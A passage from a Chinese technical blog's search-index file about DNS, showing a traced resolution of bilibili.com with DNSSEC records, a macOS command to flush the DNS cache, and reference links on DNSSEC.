class="hljs-number">2001</span>:<span class="hljs-number">7</span>fe::<span class="hljs-number">53</span>) for bilibili.com failed: network unreachable.<br>com.<span class="hljs-number">172800</span>INNSa.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSb.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSc.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSd.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSe.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSf.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSg.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSh.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSi.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSj.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSk.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSl.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSm.gtld-servers.net.<br>com.<span class="hljs-number">86400</span>INDS<span class="hljs-number">19718</span> <span class="hljs-number">13</span> <span class="hljs-number">2</span> <span class="hljs-number">8</span>ACBB0CD28F41250A80A491389424D341522D946B0DA0C0291F2D3D7 <span class="hljs-number">71</span>D7805A<br>com.<span class="hljs-number">86400</span>INRRSIGDS <span class="hljs-number">8</span> <span class="hljs-number">1</span> <span class="hljs-number">86400</span> <span class="hljs-number">20240326050000</span> <span class="hljs-number">20240313040000</span> <span class="hljs-number">30903</span> . HMM7P1NYHa5RzV8Iqk5Kko4+/<span class="hljs-number">86</span>zW+tj+amxZiFP6qFZibjGiZ0XW4Nw gToWas+AVxHF+a73XU/<span class="hljs-number">0</span>mSdL6N0xpyabRsyYYXAYaZ4lZ9W1nST5DclJ hpyGcN6bP8+fm1VKLM5wXYuZ6tyeQuvDA3g8RfsN8B5q1CT31dU6vlyL <span class="hljs-number">8</span>NfbTTSDzYnH4zZzLpojJZ5dmW6Ua3oNiFitK4Ri+<span class="hljs-number">2</span>aOtv81WBLRqNHI WjRRbiP5JBAZDAj+iV+vQATwmH2gDxXBe6WN1KTbzcV7Nc9ds0l+B1Oy SF4zKaRP3wu3P0IyMzwDT63W76yCsesmW1+SIJpweI2HLA9MBx/+DZmZ iz7i6Q<span class="hljs-built_in">=</span><span class="hljs-built_in">=</span><br>;; Received <span class="hljs-number">1172</span> bytes from <span class="hljs-number">198.97</span>.<span class="hljs-number">190.53</span>#<span class="hljs-number">53</span>(h.root-servers.net) in <span class="hljs-number">104</span> ms<br><br>;; UDP setup with <span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:<span class="hljs-number">39</span>c1::<span class="hljs-number">30</span>#<span class="hljs-number">53</span>(<span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:<span class="hljs-number">39</span>c1::<span class="hljs-number">30</span>) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:d2d::<span class="hljs-number">30</span>#<span class="hljs-number">53</span>(<span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:d2d::<span class="hljs-number">30</span>) for bilibili.com failed: network unreachable.<br>bilibili.com.<span class="hljs-number">172800</span>INNSns3.dnsv5.com.<br>bilibili.com.<span class="hljs-number">172800</span>INNSns4.dnsv5.com.<br>CK0POJMG874LJREF7EFN8430QVIT8BSM.com. <span class="hljs-number">86400</span> IN NSEC3 <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> - CK0Q2D6NI4I7EQH8NA30NS61O48UL8G5 NS SOA RRSIG DNSKEY NSEC3PARAM<br>CK0POJMG874LJREF7EFN8430QVIT8BSM.com. <span class="hljs-number">86400</span> IN RRSIG NSEC3 <span class="hljs-number">13</span> <span class="hljs-number">2</span> <span class="hljs-number">86400</span> <span class="hljs-number">20240317052456</span> <span class="hljs-number">20240310041456</span> <span class="hljs-number">4534</span> com. nDsu/HWipq9WrDO772lGr5Rm0BGksazMNQ4BCktOTsLTqadXRbTc8Tx8 W1gAunMnPlgJUg7EzY+Bu0NR3W4cig<span class="hljs-built_in">=</span><span class="hljs-built_in">=</span><br><span class="hljs-number">34</span>N8HDRIDRS931JVPDDJA5QLVPMOGVUB.com. <span class="hljs-number">86400</span> IN NSEC3 <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> - <span class="hljs-number">34</span>N8VR2QIA8E6FQT7AUGCM6FARONEELO NS DS RRSIG<br><span class="hljs-number">34</span>N8HDRIDRS931JVPDDJA5QLVPMOGVUB.com. <span class="hljs-number">86400</span> IN RRSIG NSEC3 <span class="hljs-number">13</span> <span class="hljs-number">2</span> <span class="hljs-number">86400</span> <span class="hljs-number">20240319051354</span> <span class="hljs-number">20240312040354</span> <span class="hljs-number">4534</span> com. C1pama7SsZ1nj2soxDM0wG3vGlXjMB1Mn20jEnBOAVmXFgoPN+bQpoXs UemGxrKrQe83kf10kN/<span class="hljs-number">52</span>ul4JYgIrQ<span class="hljs-built_in">=</span><span class="hljs-built_in">=</span><br>;; Received <span class="hljs-number">784</span> bytes from <span class="hljs-number">192.52</span>.<span class="hljs-number">178.30</span>#<span class="hljs-number">53</span>(k.gtld-servers.net) in <span class="hljs-number">164</span> ms<br><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">8.134</span>.<span class="hljs-number">50.24</span><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">47.103</span>.<span class="hljs-number">24.173</span><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">119.3</span>.<span class="hljs-number">70.188</span><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">139.159</span>.<span class="hljs-number">241.37</span><br>bilibili.com.<span class="hljs-number">86400</span>INNSns3.dnsv5.com.<br>bilibili.com.<span class="hljs-number">86400</span>INNSns4.dnsv5.com.<br>;; Received <span class="hljs-number">159</span> bytes from <span class="hljs-number">1.12</span>.<span class="hljs-number">0.16</span>#<span class="hljs-number">53</span>(ns4.dnsv5.com) in <span class="hljs-number">16</span> ms<br></code></pre></td></tr></table></figure><h2 id="清空DNS缓存"><a href="#清空DNS缓存" class="headerlink" title="清空DNS缓存"></a>清空DNS缓存</h2><h3 id="Mac电脑"><a href="#Mac电脑" class="headerlink" title="Mac电脑"></a>Mac电脑</h3><p><strong>sudo killall -HUP mDNSResponder</strong></p><h1 id="DNS安全加固"><a href="#DNS安全加固" class="headerlink" title="DNS安全加固"></a>DNS安全加固</h1><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1><p>【1】 dnsviz.net</p><p><a href="https://dnsviz.net/d/pizzaseo.com/dnssec/">https://dnsviz.net/d/pizzaseo.com/dnssec/</a></p><p>【2】DNSSEC 2024-01-30 13:38:58</p><p><a href="https://help.aliyun.com/document_detail/149662.html">https://help.aliyun.com/document_detail/149662.html</a></p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>dns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>dns</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
